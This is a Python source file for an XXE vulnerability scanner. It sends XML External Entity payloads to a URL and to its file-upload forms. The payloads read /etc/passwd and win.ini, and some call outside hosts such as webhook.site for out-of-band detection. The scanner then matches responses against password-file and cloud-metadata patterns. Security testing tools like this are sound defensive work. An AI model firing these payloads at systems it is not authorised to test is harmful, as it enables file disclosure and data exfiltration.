import requests
from bs4 import BeautifulSoup
import re

class XXEScanner:
    def __init__(self):
        self.payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
            <foo>&xxe;</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
            <foo>&xxe;</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "http://metadata.nicob.net/" >
            %xxe;]>
            <foo>test</foo>""",
            
            """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY % xxe SYSTEM "https://webhook.site/token" >
            %xxe;]>
            <foo>test</foo>"""
        ]
        
        self.evidence_patterns = [
            r'root:.*?:0:0:',  # Linux /etc/passwd
            r'\[fonts\]',  # Windows win.ini
            r'ami-id',  # AWS metadata
            r'computeMetadata',  # GCP metadata
            r'instanceId'  # Azure metadata
        ]
        
    def scan(self, url):
        """Scan a URL for XXE vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get the page
            response = requests.get(url, timeout=10)
            
            # Look for XML processing
            xml_indicators = [
                'text/xml',
                'application/xml',
                'application/soap+xml',
                '<xml',
                'xmlns',
                'SOAP',
                'DTD',
                'DOCTYPE',
                'ENTITY',
                'SYSTEM'
            ]
            
            has_xml = False
            for indicator in xml_indicators:
                if indicator in response.text or (response.headers.get('Content-Type') and indicator in response.headers.get('Content-Type')):
                    has_xml = True
                    break
            
            if not has_xml:
                # Look for forms that might accept XML
                forms = self._extract_forms(response.text)
                for form in forms:
                    if any(field['type'] == 'file' for field in form['inputs']):
                        has_xml = True
                        break
            
            if not has_xml:
                return vulnerabilities
            
            # Test for XXE vulnerabilities
            for payload in self.payloads:
                try:
                    # Try to send the payload as XML content
                    headers = {'Content-Type': 'text/xml; charset=utf-8'}
                    xxe_response = requests.post(url, data=payload, headers=headers, timeout=10)
                    
                    # Check for evidence of successful XXE
                    for pattern in self.evidence_patterns:
                        if re.search(pattern, xxe_response.text):
                            vulnerabilities.append({
                                'type': 'XXE',
                                'url': url,
                                'payload': payload,
                                'evidence': f'Pattern matched: {pattern}',
                                'severity': 'High',
                                'description': 'XML External Entity (XXE) vulnerability detected. The application appears to be processing XML input without proper validation.',
                                'remediation': 'Disable external entity processing in the XML parser. Use a safe XML parser configuration that disables DTDs and external entities.'
                            })
                            break
                
                except Exception as e:
                    print(f"Error testing {url} for XXE with payload: {str(e)}")
            
            # If we found forms that accept file uploads, test them as well
            forms = self._extract_forms(response.text)
            for form in forms:
                if any(field['type'] == 'file' for field in form['inputs']):
                    # Determine the form submission URL
                    action = form['action']
                    if not action:
                        action = url
                    elif not action.startswith(('http://', 'https://')):
                        # Relative URL
                        if action.startswith('/'):
                            base_url = '/'.join(url.split('/')[:3])  # http(s)://domain.com
                            action = base_url + action
                        else:
                            action = url.rsplit('/', 1)[0] + '/' + action
                    
                    # Test the form with XXE payloads
                    for payload in self.payloads:
                        try:
                            # Create a file with the XXE payload
                            files = {}
                            data = {}
                            
                            for field in form['inputs']:
                                if field['type'] == 'file':
                                    files[field['name']] = ('xxe.xml', payload, 'text/xml')
                                elif field['type'] != 'submit':
                                    data[field['name']] = field['value'] or 'test'
                            
                            # Submit the form
                            xxe_response = requests.post(action, data=data, files=files, timeout=10)
                            
                            # Check for evidence of successful XXE
                            for pattern in self.evidence_patterns:
                                if re.search(pattern, xxe_response.text):
                                    vulnerabilities.append({
                                        'type': 'XXE (File Upload)',
                                        'url': action,
                                        'payload': payload,
                                        'evidence': f'Pattern matched: {pattern}',
                                        'severity': 'High',
                                        'description': 'XML External Entity (XXE) vulnerability detected in file upload. The application appears to be processing XML input without proper validation.',
                                        'remediation': 'Disable external entity processing in the XML parser. Use a safe XML parser configuration that disables DTDs and external entities.'
                                    })
                                    break
                        
                        except Exception as e:
                            print(f"Error testing form at {action} for XXE with payload: {str(e)}")
        
        except Exception as e:
            print(f"Error scanning {url} for XXE: {str(e)}")
        
        return vulnerabilities
    
    def _extract_forms(self, html):
        """Extract forms from HTML content"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            form_details['action'] = form.get('action', '')
            form_details['method'] = form.get('method', 'get').lower()
            form_details['inputs'] = []
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                input_value = input_tag.get('value', '')
                
                if input_name:
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_value
                    })
            
            forms.append(form_details)
        
        return forms